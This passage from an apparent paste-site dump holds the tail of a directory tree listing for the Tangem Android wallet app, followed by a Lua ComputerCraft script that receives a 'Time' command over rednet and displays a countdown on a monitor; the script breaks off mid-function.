│   │   │   │                                       │   ├── SavedSwapTransactionListModel.kt
│   │   │   │                                       │   ├── SwapApproveType.kt
│   │   │   │                                       │   ├── SwapDataModel.kt
│   │   │   │                                       │   ├── SwapFeeState.kt
│   │   │   │                                       │   ├── SwapPairLeast.kt
│   │   │   │                                       │   ├── TransactionModel.kt
│   │   │   │                                       │   └── Warning.kt
│   │   │   │                                       ├── ExpressException.kt
│   │   │   │                                       ├── SwapAmount.kt
│   │   │   │                                       └── ui
│   │   │   │                                           ├── AmountFormatter.kt
│   │   │   │                                           ├── SwapState.kt
│   │   │   │                                           ├── SwapTransactionState.kt
│   │   │   │                                           ├── TokensDataStateExpress.kt
│   │   │   │                                           └── TokensDataState.kt
│   │   │   └── src
│   │   │       └── main
│   │   │           └── java
│   │   │               └── com
│   │   │                   └── tangem
│   │   │                       └── feature
│   │   │                           └── swap
│   │   │                               └── domain
│   │   │                                   ├── AllowPermissionsHandlerImpl.kt
│   │   │                                   ├── AllowPermissionsHandler.kt
│   │   │                                   ├── BlockchainInteractor.kt
│   │   │                                   ├── converters
│   │   │                                   │   └── SwapCurrencyConverter.kt
│   │   │                                   ├── DefaultBlockchainInteractor.kt
│   │   │                                   ├── DefaultInitialToCurrencyResolver.kt
│   │   │                                   ├── di
│   │   │                                   │   └── SwapDomainModule.kt
│   │   │                                   ├── InitialToCurrencyResolver.kt
│   │   │                                   ├── SwapInteractorImpl.kt
│   │   │                                   ├── SwapInteractor.kt
│   │   │                                   └── SwapTransactionRepository.kt
│   │   └── presentation
│   │       ├── build.gradle.kts
│   │       └── src
│   │           └── main
│   │               ├── java
│   │               │   └── com
│   │               │       └── tangem
│   │               │           └── feature
│   │               │               └── swap
│   │               │                   ├── analytics
│   │               │                   │   └── SwapEvents.kt
│   │               │                   ├── converters
│   │               │                   │   └── TokensDataConverter.kt
│   │               │                   ├── di
│   │               │                   │   ├── SwapFeatureTogglesManagerModule.kt
│   │               │                   │   └── SwapPresentationModule.kt
│   │               │                   ├── models
│   │               │                   │   ├── CurrenciesGroupWithFromCurrency.kt
│   │               │                   │   ├── states
│   │               │                   │   │   ├── ChooseFeeBottomSheetConfig.kt
│   │               │                   │   │   ├── ChooseProviderBottomSheetConfig.kt
│   │               │                   │   │   ├── FeeItemState.kt
│   │               │                   │   │   ├── GivePermissionBottomSheetConfig.kt
│   │               │                   │   │   ├── ProviderState.kt
│   │               │                   │   │   └── WebViewBottomSheetConfig.kt
│   │               │                   │   ├── SwapPermissionStateHolder.kt
│   │               │                   │   ├── SwapSelectTokenStateHolder.kt
│   │               │                   │   ├── SwapStateHolder.kt
│   │               │                   │   ├── SwapSuccessStateHolder.kt
│   │               │                   │   └── UiActions.kt
│   │               │                   ├── presentation
│   │               │                   │   └── SwapFragment.kt
│   │               │                   ├── router
│   │               │                   │   ├── CustomTabsManager.kt
│   │               │                   │   └── SwapRouter.kt
│   │               │                   ├── toggles
│   │               │                   │   ├── DefaultFeatureTogglesManager.kt
│   │               │                   │   └── InnerSwapFeatureTogglesManager.kt
│   │               │                   ├── ui
│   │               │                   │   ├── AutosizeTextField.kt
│   │               │                   │   ├── ChooseFeeBottomSheet.kt
│   │               │                   │   ├── ChooseProviderBottomSheet.kt
│   │               │                   │   ├── FeeItem.kt
│   │               │                   │   ├── ProviderItem.kt
│   │               │                   │   ├── StateBuilder.kt
│   │               │                   │   ├── SwapPermissionBottomSheet.kt
│   │               │                   │   ├── SwapScreenContent.kt
│   │               │                   │   ├── SwapScreen.kt
│   │               │                   │   ├── SwapSelectTokenScreen.kt
│   │               │                   │   ├── SwapSuccessScreen.kt
│   │               │                   │   ├── TransactionCard.kt
│   │               │                   │   └── WebViewBottomSheet.kt
│   │               │                   └── viewmodels
│   │               │                       ├── SwapProcessDataState.kt
│   │               │                       └── SwapViewModel.kt
│   │               └── res
│   │                   ├── drawable
│   │                   │   ├── ic_lightning_16.xml
│   │                   │   └── ill_one_inch_powered.webp
│   │                   └── drawable-night
│   │                       └── ill_one_inch_powered.webp
│   ├── tester
│   │   ├── api
│   │   │   ├── build.gradle.kts
│   │   │   └── src
│   │   │       └── main
│   │   │           └── java
│   │   │               └── com
│   │   │                   └── tangem
│   │   │                       └── features
│   │   │                           └── tester
│   │   │                               └── api
│   │   │                                   ├── AppRestarter.kt
│   │   │                                   └── TesterRouter.kt
│   │   └── impl
│   │       ├── build.gradle.kts
│   │       └── src
│   │           └── main
│   │               ├── AndroidManifest.xml
│   │               ├── java
│   │               │   └── com
│   │               │       └── tangem
│   │               │           └── feature
│   │               │               └── tester
│   │               │                   ├── ActivityClassWrapper.kt
│   │               │                   ├── apprestarter
│   │               │                   │   └── DefaultAppRestarter.kt
│   │               │                   ├── di
│   │               │                   │   ├── RestarterModule.kt
│   │               │                   │   └── TesterRouterModule.kt
│   │               │                   └── presentation
│   │               │                       ├── actions
│   │               │                       │   ├── TesterActionsContentState.kt
│   │               │                       │   ├── TesterActionsScreen.kt
│   │               │                       │   └── TesterActionsViewModel.kt
│   │               │                       ├── featuretoggles
│   │               │                       │   ├── models
│   │               │                       │   │   └── TesterFeatureToggle.kt
│   │               │                       │   ├── state
│   │               │                       │   │   └── FeatureTogglesContentState.kt
│   │               │                       │   ├── ui
│   │               │                       │   │   └── FeatureTogglesScreen.kt
│   │               │                       │   └── viewmodels
│   │               │                       │       └── FeatureTogglesViewModel.kt
│   │               │                       ├── menu
│   │               │                       │   ├── state
│   │               │                       │   │   └── TesterMenuContentState.kt
│   │               │                       │   └── ui
│   │               │                       │       └── TesterMenuScreen.kt
│   │               │                       ├── navigation
│   │               │                       │   ├── DefaultTesterRouter.kt
│   │               │                       │   ├── InnerTesterRouter.kt
│   │               │                       │   └── TesterScreen.kt
│   │               │                       └── TesterActivity.kt
│   │               └── res
│   │                   └── values
│   │                       └── strings.xml
│   ├── tokendetails
│   │   ├── api
│   │   │   ├── build.gradle.kts
│   │   │   └── src
│   │   │       └── main
│   │   │           └── kotlin
│   │   │               └── com
│   │   │                   └── tangem
│   │   │                       └── features
│   │   │                           └── tokendetails
│   │   │                               ├── featuretoggles
│   │   │                               │   └── TokenDetailsFeatureToggles.kt
│   │   │                               └── navigation
│   │   │                                   └── TokenDetailsRouter.kt
│   │   └── impl
│   │       ├── build.gradle.kts
│   │       └── src
│   │           └── main
│   │               └── kotlin
│   │                   └── com
│   │                       └── tangem
│   │                           └── feature
│   │                               └── tokendetails
│   │                                   ├── di
│   │                                   │   ├── TokenDetailsFeatureTogglesModule.kt
│   │                                   │   └── TokenDetailsRouterModule.kt
│   │                                   ├── featuretoggles
│   │                                   │   └── DefaultTokenDetailsFeatureToggles.kt
│   │                                   └── presentation
│   │                                       ├── router
│   │                                       │   ├── DefaultTokenDetailsRouter.kt
│   │                                       │   └── InnerTokenDetailsRouter.kt
│   │                                       ├── tokendetails
│   │                                       │   ├── analytics
│   │                                       │   │   ├── TokenDetailsAnalyticsEvent.kt
│   │                                       │   │   ├── TokenDetailsCurrencyStatusAnalyticsSender.kt
│   │                                       │   │   ├── TokenDetailsNotificationsAnalyticsSender.kt
│   │                                       │   │   └── utils
│   │                                       │   │       └── CryptoCurrencyMapper.kt
│   │                                       │   ├── state
│   │                                       │   │   ├── components
│   │                                       │   │   │   ├── ExchangeStatusNotifications.kt
│   │                                       │   │   │   ├── TokenDetailsActionButton.kt
│   │                                       │   │   │   ├── TokenDetailsDialogConfig.kt
│   │                                       │   │   │   ├── TokenDetailsNotification.kt
│   │                                       │   │   │   └── TokenDetailsPullToRefreshConfig.kt
│   │                                       │   │   ├── factory
│   │                                       │   │   │   ├── TokenDetailsActionButtonsConverter.kt
│   │                                       │   │   │   ├── TokenDetailsIconStateConverter.kt
│   │                                       │   │   │   ├── TokenDetailsLoadedBalanceConverter.kt
│   │                                       │   │   │   ├── TokenDetailsNotificationConverter.kt
│   │                                       │   │   │   ├── TokenDetailsRefreshStateConverter.kt
│   │                                       │   │   │   ├── TokenDetailsSkeletonStateConverter.kt
│   │                                       │   │   │   ├── TokenDetailsStateFactory.kt
│   │                                       │   │   │   ├── TokenDetailsSwapTransactionsStateConverter.kt
│   │                                       │   │   │   ├── TokenStakingStateConverter.kt
│   │                                       │   │   │   └── txhistory
│   │                                       │   │   │       ├── TokenDetailsLoadedTxHistoryConverter.kt
│   │                                       │   │   │       ├── TokenDetailsLoadingTxHistoryConverter.kt
│   │                                       │   │   │       ├── TokenDetailsTxHistoryItemFlowConverter.kt
│   │                                       │   │   │       └── TokenDetailsTxHistoryTransactionStateConverter.kt
│   │                                       │   │   ├── IconState.kt
│   │                                       │   │   ├── StakingBlockState.kt
│   │                                       │   │   ├── SwapTransactionsState.kt
│   │                                       │   │   ├── TokenDetailsAppBarMenuConfig.kt
│   │                                       │   │   ├── TokenDetailsBalanceBlockState.kt
│   │                                       │   │   ├── TokenDetailsState.kt
│   │                                       │   │   ├── TokenDetailsTopAppBarConfig.kt
│   │                                       │   │   └── TokenInfoBlockState.kt
│   │                                       │   ├── TokenDetailsPreviewData.kt
│   │                                       │   ├── ui
│   │                                       │   │   ├── components
│   │                                       │   │   │   ├── DropdownMenu.kt
│   │                                       │   │   │   ├── exchange
│   │                                       │   │   │   │   ├── ExchangeEstimate.kt
│   │                                       │   │   │   │   ├── ExchangeProvider.kt
│   │                                       │   │   │   │   ├── ExchangeStatusBlock.kt
│   │                                       │   │   │   │   ├── ExchangeStatusBottomSheet.kt
│   │                                       │   │   │   │   └── ExchangeStatusItems.kt
│   │                                       │   │   │   ├── TokenDetailsBalanceBlock.kt
│   │                                       │   │   │   ├── TokenDetailsDialogs.kt
│   │                                       │   │   │   ├── TokenDetailsTopAppBar.kt
│   │                                       │   │   │   ├── TokenIcon.kt
│   │                                       │   │   │   ├── TokenInfoBlock.kt
│   │                                       │   │   │   └── TokenStakingBlock.kt
│   │                                       │   │   └── TokenDetailsScreen.kt
│   │                                       │   └── viewmodels
│   │                                       │       ├── ExchangeStatusFactory.kt
│   │                                       │       ├── TokenDetailsClickIntents.kt
│   │                                       │       └── TokenDetailsViewModel.kt
│   │                                       └── TokenDetailsFragment.kt
│   └── wallet
│       ├── api
│       │   ├── build.gradle.kts
│       │   └── src
│       │       └── main
│       │           └── kotlin
│       │               └── com
│       │                   └── tangem
│       │                       └── features
│       │                           └── wallet
│       │                               └── navigation
│       │                                   └── WalletRouter.kt
│       └── impl
│           ├── build.gradle.kts
│           └── src
│               └── main
│                   ├── java
│                   │   └── com
│                   │       └── tangem
│                   │           └── feature
│                   │               └── wallet
│                   │                   ├── di
│                   │                   │   ├── FeatureTogglesModule.kt
│                   │                   │   └── WalletRouterModule.kt
│                   │                   ├── featuretoggle
│                   │                   │   └── WalletFeatureToggles.kt
│                   │                   └── presentation
│                   │                       ├── common
│                   │                       │   ├── component
│                   │                       │   │   ├── NetworkGroupItem.kt
│                   │                       │   │   ├── token
│                   │                       │   │   │   ├── LockedRectangle.kt
│                   │                       │   │   │   ├── NonFiatContentBlock.kt
│                   │                       │   │   │   ├── TokenCryptoAmount.kt
│                   │                       │   │   │   ├── TokenFiatAmount.kt
│                   │                       │   │   │   ├── TokenPrice.kt
│                   │                       │   │   │   └── TokenTitle.kt
│                   │                       │   │   └── TokenItem.kt
│                   │                       │   ├── state
│                   │                       │   │   └── TokenItemState.kt
│                   │                       │   └── WalletPreviewData.kt
│                   │                       ├── deeplink
│                   │                       │   └── WalletDeepLinksHandler.kt
│                   │                       ├── organizetokens
│                   │                       │   ├── analytics
│                   │                       │   │   └── PortfolioOrganizeTokensAnalyticsEvent.kt
│                   │                       │   ├── Intents.kt
│                   │                       │   ├── model
│                   │                       │   │   ├── DraggableItem.kt
│                   │                       │   │   ├── OrganizeTokensListState.kt
│                   │                       │   │   └── OrganizeTokensState.kt
│                   │                       │   ├── OrganizeTokensScreen.kt
│                   │                       │   ├── OrganizeTokensStateHolder.kt
│                   │                       │   ├── OrganizeTokensViewModel.kt
│                   │                       │   └── utils
│                   │                       │       ├── common
│                   │                       │       │   ├── DraggableItemOperations.kt
│                   │                       │       │   ├── DraggableItemsOperations.kt
│                   │                       │       │   ├── IdsOperations.kt
│                   │                       │       │   ├── OrganiseTokensListStateOperations.kt
│                   │                       │       │   └── TokenListOperations.kt
│                   │                       │       ├── converter
│                   │                       │       │   ├── error
│                   │                       │       │   │   ├── TokenListErrorConverter.kt
│                   │                       │       │   │   └── TokenListSortingErrorConverter.kt
│                   │                       │       │   ├── InProgressStateConverter.kt
│                   │                       │       │   ├── items
│                   │                       │       │   │   ├── CryptoCurrencyToDraggableItemConverter.kt
│                   │                       │       │   │   ├── NetworkGroupToDraggableItemsConverter.kt
│                   │                       │       │   │   └── TokenListToListStateConverter.kt
│                   │                       │       │   └── TokenListToStateConverter.kt
│                   │                       │       ├── CryptoCurrenciesIdsResolver.kt
│                   │                       │       └── dnd
│                   │                       │           ├── DragAndDropAdapter.kt
│                   │                       │           └── DraggableGroupsOperations.kt
│                   │                       ├── router
│                   │                       │   ├── DefaultWalletRouter.kt
│                   │                       │   ├── InnerWalletRouter.kt
│                   │                       │   └── WalletRoute.kt
│                   │                       ├── wallet
│                   │                       │   ├── analytics
│                   │                       │   │   ├── PortfolioEvent.kt
│                   │                       │   │   ├── utils
│                   │                       │   │   │   ├── SelectedWalletAnalyticsSender.kt
│                   │                       │   │   │   ├── TokenListAnalyticsSender.kt
│                   │                       │   │   │   └── WalletWarningsAnalyticsSender.kt
│                   │                       │   │   └── WalletScreenAnalyticsEvent.kt
│                   │                       │   ├── domain
│                   │                       │   │   ├── BackupValidator.kt
│                   │                       │   │   ├── GetMultiWalletWarningsFactory.kt
│                   │                       │   │   ├── GetSingleWalletWarningsFactory.kt
│                   │                       │   │   ├── HasSingleWalletSignedHashesUseCase.kt
│                   │                       │   │   ├── ScanCardToUnlockWalletClickHandler.kt
│                   │                       │   │   ├── UseCaseExt.kt
│                   │                       │   │   ├── UserWalletExt.kt
│                   │                       │   │   ├── WalletAdditionalInfoFactory.kt
│                   │                       │   │   ├── WalletImageResolver.kt
│                   │                       │   │   ├── WalletNameMigrationUseCase.kt
│                   │                       │   │   └── WalletWithFundsChecker.kt
│                   │                       │   ├── loaders
│                   │                       │   │   ├── implementors
│                   │                       │   │   │   ├── MultiWalletContentLoaderFactory.kt
│                   │                       │   │   │   ├── MultiWalletContentLoader.kt
│                   │                       │   │   │   ├── SingleWalletContentLoaderFactory.kt
│                   │                       │   │   │   ├── SingleWalletContentLoader.kt
│                   │                       │   │   │   ├── SingleWalletWithTokenContentLoaderFactory.kt
│                   │                       │   │   │   ├── SingleWalletWithTokenContentLoader.kt
│                   │                       │   │   │   ├── VisaWalletContentLoaderFactory.kt
│                   │                       │   │   │   ├── VisaWalletContentLoader.kt
│                   │                       │   │   │   └── WalletContentLoader.kt
│                   │                       │   │   ├── WalletContentLoaderFactory.kt
│                   │                       │   │   ├── WalletLoaderStorage.kt
│                   │                       │   │   └── WalletScreenContentLoader.kt
│                   │                       │   ├── state
│                   │                       │   │   ├── model
│                   │                       │   │   │   ├── ActionsBottomSheetConfig.kt
│                   │                       │   │   │   ├── BalancesAndLimitsBlockState.kt
│                   │                       │   │   │   ├── BalancesAndLimitsBottomSheetConfig.kt
│                   │                       │   │   │   ├── DepositButtonState.kt
│                   │                       │   │   │   ├── holder
│                   │                       │   │   │   │   ├── LockedWalletStateHolder.kt
│                   │                       │   │   │   │   └── TxHistoryStateHolder.kt
│                   │                       │   │   │   ├── ManageTokensButtonConfig.kt
│                   │                       │   │   │   ├── TokenActionButtonConfig.kt
│                   │                       │   │   │   ├── VisaTxDetailsBottomSheetConfig.kt
│                   │                       │   │   │   ├── WalletAdditionalInfo.kt
│                   │                       │   │   │   ├── WalletAlertState.kt
│                   │                       │   │   │   ├── WalletBottomSheetConfig.kt
│                   │                       │   │   │   ├── WalletCardState.kt
│                   │                       │   │   │   ├── WalletEvent.kt
│                   │                       │   │   │   ├── WalletManageButton.kt
│                   │                       │   │   │   ├── WalletNotification.kt
│                   │                       │   │   │   ├── WalletPullToRefreshConfig.kt
│                   │                       │   │   │   ├── WalletScreenState.kt
│                   │                       │   │   │   ├── WalletState.kt
│                   │                       │   │   │   ├── WalletTokensListState.kt
│                   │                       │   │   │   └── WalletTopBarConfig.kt
│                   │                       │   │   ├── transformers
│                   │                       │   │   │   ├── AddWalletTransformer.kt
│                   │                       │   │   │   ├── CloseBottomSheetTransformer.kt
│                   │                       │   │   │   ├── converter
│                   │                       │   │   │   │   ├── BalancesAndLimitsBottomSheetConverter.kt
│                   │                       │   │   │   │   ├── MultiWalletCardStateConverter.kt
│                   │                       │   │   │   │   ├── MultiWalletCurrencyActionsConverter.kt
│                   │                       │   │   │   │   ├── SingleWalletCardStateConverter.kt
│                   │                       │   │   │   │   ├── SingleWalletMarketPriceConverter.kt
│                   │                       │   │   │   │   ├── TokenItemStateConverter.kt
│                   │                       │   │   │   │   ├── TokenListStateConverter.kt
│                   │                       │   │   │   │   ├── TxHistoryItemFlowConverter.kt
│                   │                       │   │   │   │   ├── TxHistoryItemStateConverter.kt
│                   │                       │   │   │   │   ├── VisaTxDetailsBottomSheetConverter.kt
│                   │                       │   │   │   │   └── VisaTxHistoryItemStateConverter.kt
│                   │                       │   │   │   ├── DeleteWalletTransformer.kt
│                   │                       │   │   │   ├── InitializeWalletsTransformer.kt
│                   │                       │   │   │   ├── OpenBottomSheetTransformer.kt
│                   │                       │   │   │   ├── ReinitializeWalletTransformer.kt
│                   │                       │   │   │   ├── RenameWalletTransformer.kt
│                   │                       │   │   │   ├── ScrollToWalletTransformer.kt
│                   │                       │   │   │   ├── SendEventTransformer.kt
│                   │                       │   │   │   ├── SetBalancesAndLimitsTransformer.kt
│                   │                       │   │   │   ├── SetCryptoCurrencyActionsTransformer.kt
│                   │                       │   │   │   ├── SetPrimaryCurrencyTransformer.kt
│                   │                       │   │   │   ├── SetRefreshStateTransformer.kt
│                   │                       │   │   │   ├── SetTokenListErrorTransformer.kt
│                   │                       │   │   │   ├── SetTokenListTransformer.kt
│                   │                       │   │   │   ├── SetTxHistoryCountErrorTransformer.kt
│                   │                       │   │   │   ├── SetTxHistoryCountTransformer.kt
│                   │                       │   │   │   ├── SetTxHistoryItemsErrorTransformer.kt
│                   │                       │   │   │   ├── SetTxHistoryItemsTransformer.kt
│                   │                       │   │   │   ├── SetWarningsTransformer.kt
│                   │                       │   │   │   ├── UnlockWalletTransformer.kt
│                   │                       │   │   │   ├── UpdateBalanceHidingModeTransformer.kt
│                   │                       │   │   │   ├── UpdateWalletCardsCountTransformer.kt
│                   │                       │   │   │   ├── WalletScreenStateTransformer.kt
│                   │                       │   │   │   └── WalletStateTransformer.kt
│                   │                       │   │   ├── utils
│                   │                       │   │   │   ├── UserWalletConverterExt.kt
│                   │                       │   │   │   ├── WalletEventSender.kt
│                   │                       │   │   │   └── WalletLoadingStateFactory.kt
│                   │                       │   │   └── WalletStateController.kt
│                   │                       │   ├── subscribers
│                   │                       │   │   ├── BasicTokenListSubscriber.kt
│                   │                       │   │   ├── MultiWalletTokenListSubscriber.kt
│                   │                       │   │   ├── MultiWalletWarningsSubscriber.kt
│                   │                       │   │   ├── PrimaryCurrencySubscriber.kt
│                   │                       │   │   ├── SingleWalletButtonsSubscriber.kt
│                   │                       │   │   ├── SingleWalletNotificationsSubscriber.kt
│                   │                       │   │   ├── SingleWalletWithTokenListSubscriber.kt
│                   │                       │   │   ├── TxHistorySubscriber.kt
│                   │                       │   │   ├── VisaWalletSubscriber.kt
│                   │                       │   │   └── WalletSubscriber.kt
│                   │                       │   ├── ui
│                   │                       │   │   ├── components
│                   │                       │   │   │   ├── common
│                   │                       │   │   │   │   ├── WalletBottomSheet.kt
│                   │                       │   │   │   │   ├── WalletCard.kt
│                   │                       │   │   │   │   ├── WalletContent.kt
│                   │                       │   │   │   │   ├── WalletNotifications.kt
│                   │                       │   │   │   │   ├── WalletPullToRefreshIndicator.kt
│                   │                       │   │   │   │   └── WalletTopBar.kt
│                   │                       │   │   │   ├── multicurrency
│                   │                       │   │   │   │   ├── MultiCurrencyContentItem.kt
│                   │                       │   │   │   │   ├── MultiCurrencyContent.kt
│                   │                       │   │   │   │   └── MultiCurrencyOrganizeButton.kt
│                   │                       │   │   │   ├── singlecurrency
│                   │                       │   │   │   │   ├── SingleCurrencyControlButtons.kt
│                   │                       │   │   │   │   └── SingleCurrencyMarketPriceBlock.kt
│                   │                       │   │   │   ├── TangemSnapFlingBehavior.kt
│                   │                       │   │   │   ├── TangemSnapLayoutInfoProvider.kt
│                   │                       │   │   │   ├── TokenActionsBottomSheet.kt
│                   │                       │   │   │   ├── visa
│                   │                       │   │   │   │   ├── BalancesAndLimitsBlock.kt
│                   │                       │   │   │   │   ├── BalancesAndLimitsBottomSheet.kt
│                   │                       │   │   │   │   ├── Blocks.kt
│                   │                       │   │   │   │   ├── VisaDepositButton.kt
│                   │                       │   │   │   │   └── VisaTxDetailsBottomSheet.kt
│                   │                       │   │   │   └── WalletsList.kt
│                   │                       │   │   ├── utils
│                   │                       │   │   │   ├── ChangeWalletAnimator.kt
│                   │                       │   │   │   ├── LazyListStateExt.kt
│                   │                       │   │   │   ├── ReviewManagerRequester.kt
│                   │                       │   │   │   ├── ScrollOffsetCollector.kt
│                   │                       │   │   │   ├── WalletsListInteractionsCollector.kt
│                   │                       │   │   │   └── WalletsScrollPreviewExt.kt
│                   │                       │   │   ├── WalletAlert.kt
│                   │                       │   │   ├── WalletEventEffect.kt
│                   │                       │   │   ├── WalletScreen.kt
│                   │                       │   │   └── WalletsListEffects.kt
│                   │                       │   ├── utils
│                   │                       │   │   └── ScreenLifecycleProvider.kt
│                   │                       │   └── viewmodels
│                   │                       │       ├── intents
│                   │                       │       │   ├── BaseWalletClickIntents.kt
│                   │                       │       │   ├── VisaWalletIntents.kt
│                   │                       │       │   ├── WalletCardClickIntents.kt
│                   │                       │       │   ├── WalletClickIntents.kt
│                   │                       │       │   ├── WalletContentClickIntents.kt
│                   │                       │       │   ├── WalletCurrencyActionsClickIntents.kt
│                   │                       │       │   └── WalletWarningsClickIntents.kt
│                   │                       │       ├── WalletsUpdateActionResolver.kt
│                   │                       │       └── WalletViewModel.kt
│                   │                       └── WalletFragment.kt
│                   └── res
│                       └── drawable
│                           ├── ic_empty_64.xml
│                           ├── ill_avrora_card2_120_106.webp
│                           ├── ill_avrora_card3_120_106.webp
│                           ├── ill_bad_card2_120_106.webp
│                           ├── ill_bad_card3_120_106.webp
│                           ├── ill_dev_120_106.webp
│                           ├── ill_grim_card2_120_106.webp
│                           ├── ill_grim_card3_120_106.webp
│                           ├── ill_jr_card2_120_106.webp
│                           ├── ill_jr_card3_120_106.webp
│                           ├── ill_kaspa_card2_120_106.webp
│                           ├── ill_kaspa_card3_120_106.webp
│                           ├── ill_note_binance_120_106.webp
│                           ├── ill_note_btc_120_106.webp
│                           ├── ill_note_cardano_120_106.webp
│                           ├── ill_note_doge_120_106.webp
│                           ├── ill_note_ethereum_120_106.webp
│                           ├── ill_note_xrp_120_106.webp
│                           ├── ill_nwe_card2_120_106.webp
│                           ├── ill_nwe_card3_120_106.webp
│                           ├── ill_pizza_day_card2_120_106.webp
│                           ├── ill_pizza_day_card3_120_106.webp
│                           ├── ill_satoshi_card2_120_106.webp
│                           ├── ill_satoshi_card3_120_106.webp
│                           ├── ill_shiba_card2_120_106.webp
│                           ├── ill_shiba_card3_120_106.webp
│                           ├── ill_start2coin_120_106.webp
│                           ├── ill_traillant_card2_120_106.webp
│                           ├── ill_traillant_card3_120_106.webp
│                           ├── ill_tron_card2_120_106.webp
│                           ├── ill_tron_card3_120_106.webp
│                           ├── ill_twins_120_106.webp
│                           ├── ill_vechain_card2_120_106.webp
│                           ├── ill_vechain_card3_120_106.webp
│                           ├── ill_wallet1_cards1_120_106.webp
│                           ├── ill_wallet1_cards2_120_106.webp
│                           ├── ill_wallet1_cards3_120_106.webp
│                           ├── ill_wallet2_cards2_120_106.webp
│                           ├── ill_wallet2_cards3_120_106.webp
│                           ├── ill_wallet_old_white_120_106.webp
│                           ├── ill_white_card2_120_106.webp
│                           ├── ill_white_card3_120_106.webp
│                           └── img_tangem_logo_90_24.xml
├── Gemfile
├── Gemfile.lock
├── gradle
│   ├── dependencies.toml
│   └── wrapper
│       ├── gradle-wrapper.jar
│       └── gradle-wrapper.properties
├── gradle.properties
├── gradlew
├── gradlew.bat
├── libs
│   ├── auth
│   │   ├── build.gradle.kts
│   │   └── src
│   │       └── main
│   │           └── java
│   │               └── com
│   │                   └── tangem
│   │                       └── lib
│   │                           └── auth
│   │                               ├── ExpressAuthProvider.kt
│   │                               ├── sessionId
│   │                               │   └── ExpressSessionIdGenerator.kt
│   │                               └── StakeKitAuthProvider.kt
│   ├── blockchain-sdk
│   │   ├── build.gradle.kts
│   │   └── src
│   │       ├── main
│   │       │   └── java
│   │       │       └── com
│   │       │           └── tangem
│   │       │               └── blockchainsdk
│   │       │                   ├── accountcreator
│   │       │                   │   └── DefaultAccountCreator.kt
│   │       │                   ├── BlockchainSDKFactory.kt
│   │       │                   ├── converters
│   │       │                   │   ├── BlockchainProviderTypesConverter.kt
│   │       │                   │   └── BlockchainSDKConfigConverter.kt
│   │       │                   ├── datastorage
│   │       │                   │   └── DefaultBlockchainDataStorage.kt
│   │       │                   ├── DefaultBlockchainSDKFactory.kt
│   │       │                   ├── di
│   │       │                   │   └── BlockchainSDKFactoryModule.kt
│   │       │                   ├── featuretoggles
│   │       │                   │   ├── BlockchainSDKFeatureToggles.kt
│   │       │                   │   └── DefaultBlockchainSDKFeatureToggles.kt
│   │       │                   ├── loader
│   │       │                   │   └── BlockchainProvidersResponseLoader.kt
│   │       │                   ├── store
│   │       │                   │   ├── DefaultRuntimeStore.kt
│   │       │                   │   └── RuntimeStore.kt
│   │       │                   ├── utils
│   │       │                   │   └── Blockchain.kt
│   │       │                   └── WalletManagerFactoryCreator.kt
│   │       └── test
│   │           └── java
│   │               └── com
│   │                   └── tangem
│   │                       └── blockchainsdk
│   │                           └── loader
│   │                               └── BlockchainProvidersResponseLoaderTest.kt
│   ├── crypto
│   │   ├── build.gradle.kts
│   │   └── src
│   │       └── main
│   │           └── java
│   │               └── com
│   │                   └── tangem
│   │                       └── lib
│   │                           └── crypto
│   │                               ├── BlockchainUtils.kt
│   │                               ├── converter
│   │                               │   └── XrpTaggedAddressConverter.kt
│   │                               ├── models
│   │                               │   ├── AnalyticsData.kt
│   │                               │   ├── ApproveTxData.kt
│   │                               │   ├── Currency.kt
│   │                               │   ├── errors
│   │                               │   │   └── UserCancelledException.kt
│   │                               │   ├── ProxyAmount.kt
│   │                               │   ├── ProxyFee.kt
│   │                               │   ├── ProxyFees.kt
│   │                               │   ├── ProxyFiatCurrency.kt
│   │                               │   ├── ProxyNetworkInfo.kt
│   │                               │   ├── SwapTxData.kt
│   │                               │   ├── transactions
│   │                               │   │   └── SendTxResult.kt
│   │                               │   └── XrpTaggedAddress.kt
│   │                               ├── TransactionManager.kt
│   │                               └── UserWalletManager.kt
│   └── visa
│       ├── build.gradle.kts
│       └── src
│           └── main
│               ├── java
│               │   └── com
│               │       └── tangem
│               │           └── lib
│               │               └── visa
│               │                   ├── ERC20.java
│               │                   ├── TangemBridgeProcessor.java
│               │                   ├── TangemPaymentAccount.java
│               │                   └── TangemPaymentAccountRegistry.java
│               └── kotlin
│                   └── com
│                       └── tangem
│                           └── lib
│                               └── visa
│                                   ├── api
│                                   │   ├── VisaApiBuilder.kt
│                                   │   └── VisaApi.kt
│                                   ├── DefaultVisaContractInfoProvider.kt
│                                   ├── model
│                                   │   ├── VisaContractInfo.kt
│                                   │   └── VisaTxHistoryResponse.kt
│                                   ├── utils
│                                   │   ├── BigIntegerExt.kt
│                                   │   ├── ByteArrayExt.kt
│                                   │   └── VisaConfig.kt
│                                   └── VisaContractInfoProvider.kt
├── plugins
│   └── configuration
│       ├── build.gradle.kts
│       ├── settings.gradle.kts
│       └── src
│           └── main
│               └── kotlin
│                   └── com
│                       └── tangem
│                           └── plugin
│                               └── configuration
│                                   ├── ConfigurationPlugin.kt
│                                   ├── configurations
│                                   │   ├── DetektConfigurations.kt
│                                   │   ├── extension
│                                   │   │   ├── AppExtensionConfigurations.kt
│                                   │   │   ├── BaseExtensionConfigurations.kt
│                                   │   │   └── LibraryExtensionConfigurations.kt
│                                   │   ├── KotlinConfigurations.kt
│                                   │   └── ProjectConfigurations.kt
│                                   ├── model
│                                   │   ├── AppConfig.kt
│                                   │   ├── BuildConfigField.kt
│                                   │   └── BuildType.kt
│                                   └── utils
│                                       ├── BuildConfigFieldFactory.kt
│                                       └── VersionCatalogsUtils.kt
├── settings.gradle.kts
└── tangem-android-tools

1525 directories, 2636 files
"
WSBXZkm6,Remote-Functions-Receiver,Celestial_Dodo,Lua,Sunday 2nd of June 2024 09:32:51 PM CDT,"rednet.open(""top"")

local WaitingForInput = true
local commands = {""Time""}

--local time = 10 --tonumber(io.read())
local speaker = peripheral.wrap(""back"")
local monitor = peripheral.find(""monitor"")
monitor.setCursorPos(1, 1)
monitor.clear()

monitor.write(os.getComputerID())
print(os.getComputerID())

monitor.setCursorPos(1,2)
print(""Waiting For Command..."")
monitor.write(""Waiting For Command..."")

function mvalid(message)
    for _, validMessage in ipairs(commands) do
        if string.find(message, validMessage) then
            return true
        end
    end
    return false
end

function convertTime(time)
    local hours = math.floor(time / 3600)
    local minutes = math.floor((time % 3600) / 60)
    local seconds = time % 60
    
    monitor.clear()
    monitor.setCursorPos(1,1)
    monitor.write(""Hours:   ""..hours)
    monitor.setCursorPos(1,2)
    monitor.write(""Minutes: ""..minutes)
    monitor.setCursorPos(1,3)
    monitor.write(""Seconds: ""..seconds)
end

function StartTimer(time)
